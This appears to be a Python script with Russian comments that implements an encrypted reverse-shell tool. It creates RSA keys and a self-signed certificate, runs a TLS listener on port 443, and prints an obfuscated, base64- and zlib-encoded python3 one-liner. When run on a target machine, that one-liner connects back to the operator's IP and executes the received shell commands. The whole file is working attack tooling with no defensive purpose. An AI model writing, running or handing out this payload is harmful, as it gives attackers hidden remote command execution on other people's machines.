import os
import socket
import ssl
from subprocess import run, CalledProcessError
import base64
import zlib
from threading import Thread
from Crypto.PublicKey import RSA


def keys_check_or_create(ip_address):
    """
    Проверяет наличие ключей и сертификатов. Если есть, предлагает использовать существующие.
    """
    keys_dir = "keys"
    os.makedirs(keys_dir, exist_ok=True)

    private_key_path = os.path.join(keys_dir, "private_key.pem")
    public_key_path = os.path.join(keys_dir, "public_key.pem")
    cert_path = os.path.join(keys_dir, "server.crt")

    if os.path.exists(private_key_path) and os.path.exists(public_key_path) and os.path.exists(cert_path):
        print("[*] Найдены существующие ключи и сертификат.")
        use_existing = input("[?] Использовать существующие ключи и сертификат для клиента? (y/n): ").strip().lower()
        if use_existing == "y":
            print("[*] Используются существующие ключи и сертификат.")
            compressed_client_code = generate_and_compress_client_code(ip_address, 443)
            print("[--- One-Liner Python3 Client Code ---]")
            print(f"python3 -c \"{compressed_client_code}\"")
            print("[--- End of Client Code ---]")
            return cert_path, private_key_path
        else:
            print("[*] Генерация новых ключей и сертификата.")
    else:
        print("[*] Ключи и сертификаты не найдены. Генерация новых.")

    # Генерация новых ключей и сертификата
    generate_new_keys_and_certificate(keys_dir, ip_address)
    compressed_client_code = generate_and_compress_client_code(ip_address, 443)
    print("[--- One-Liner Python3 Client Code ---]")
    print(f"python3 -c \"{compressed_client_code}\"")
    print("[--- End of Client Code ---]")

    return cert_path, private_key_path


def generate_new_keys_and_certificate(keys_dir, ip_address):
    """
    Генерирует новые RSA-ключи и самоподписанный сертификат.
    """
    key = RSA.generate(2048)

    private_key_path = os.path.join(keys_dir, "private_key.pem")
    with open(private_key_path, "wb") as f:
        f.write(key.export_key())
    print("[*] Приватный ключ сгенерирован.")

    public_key_path = os.path.join(keys_dir, "public_key.pem")
    with open(public_key_path, "wb") as f:
        f.write(key.publickey().export_key())
    print("[*] Публичный ключ сгенерирован.")

    cert_path = os.path.join(keys_dir, "server.crt")
    generate_certificate(private_key_path, cert_path, ip_address)
    print("[*] Самоподписанный сертификат сгенерирован.")


def generate_certificate(private_key_path, cert_path, ip_address):
    """
    Генерация самоподписанного сертификата.
    """
    openssl_config = "openssl.cnf"

    with open(openssl_config, "w") as f:
        f.write(f"""
[ req ]
distinguished_name = req_distinguished_name
x509_extensions = v3_req
prompt = no

[ req_distinguished_name ]
C = US
ST = California
L = SanFrancisco
O = MyOrg
OU = IT
CN = {ip_address}

[ v3_req ]
subjectAltName = @alt_names

[ alt_names ]
IP.1 = {ip_address}
""")

    try:
        openssl_command = [
            "openssl", "req", "-new", "-x509",
            "-key", private_key_path,
            "-out", cert_path,
            "-days", "365",
            "-config", openssl_config
        ]
        run(openssl_command, check=True)
        print("[*] Сертификат успешно сгенерирован.")
    except CalledProcessError as e:
        print(f"[!] Ошибка OpenSSL: {e}")
    finally:
        if os.path.exists(openssl_config):
            os.remove(openssl_config)


def generate_and_compress_client_code(ip, port):
    """
    Генерация и сжатие клиентского кода.
    """
    certfile = os.path.join("keys", "server.crt")
    with open(certfile, "r") as f:
        cert_content = f.read()

    client_code = f"""
import socket, ssl, subprocess
CERT=\"\"\"{cert_content}\"\"\"
def connect():
    context=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_verify_locations(cadata=CERT)
    with socket.create_connection(("{ip}", {port})) as sock:
        with context.wrap_socket(sock, server_hostname="{ip}") as ssock:
            while True:
                cmd=ssock.recv(8192).decode()
                if cmd.lower()=="exit":break
                output=subprocess.getoutput(cmd)
                ssock.sendall(output.encode())
connect()
"""

    compressed_code = zlib.compress(client_code.encode())
    encoded_code = base64.b64encode(compressed_code).decode()
    return f"import zlib,base64;exec(zlib.decompress(base64.b64decode('{encoded_code}')))"


def start_server(ip, port=443):
    """
    Запуск TLS-сервера.
    """
    certfile, keyfile = keys_check_or_create(ip)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=certfile, keyfile=keyfile)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((ip, port))
        server_socket.listen(5)
        print(f"[*] Сервер слушает на {ip}:{port}")

        with context.wrap_socket(server_socket, server_side=True) as tls_server:
            try:
                while True:
                    client_socket, addr = tls_server.accept()
                    print(f"[+] Подключение от {addr}")
                    handle_client(client_socket)
            except KeyboardInterrupt:
                print("\n[*] Завершение работы сервера.")
                tls_server.close()


def handle_client(client_socket):
    """
    Обработка команд от клиента.
    """
    buffer_size = 8192
    try:
        while True:
            command = input("Shell> ")
            if command.lower() in ["exit", "quit"]:
                confirm = input("[?] Завершить работу сервера? (y/n): ").strip().lower()
                if confirm == "y":
                    print("[*] Завершение работы сервера.")
                    client_socket.sendall(b"exit")
                    client_socket.close()
                    exit(0)  # Завершение программы
                else:
                    print("[*] Сеанс завершён, но сервер продолжает слушать.")
                    client_socket.sendall(b"exit")
                    client_socket.close()
                    break
            client_socket.sendall(command.encode())
            response = client_socket.recv(buffer_size).decode()
            print(response)
    except Exception as e:
        print(f"[!] Ошибка: {e}")
    finally:
        client_socket.close()


if __name__ == "__main__":
    server_ip = input("[Введите IP-адрес сервера (например, 192.168.1.11)]: ").strip()
    if not server_ip:
        print("[!] IP-адрес обязателен. Завершение.")
    else:
        start_server(server_ip, 443)
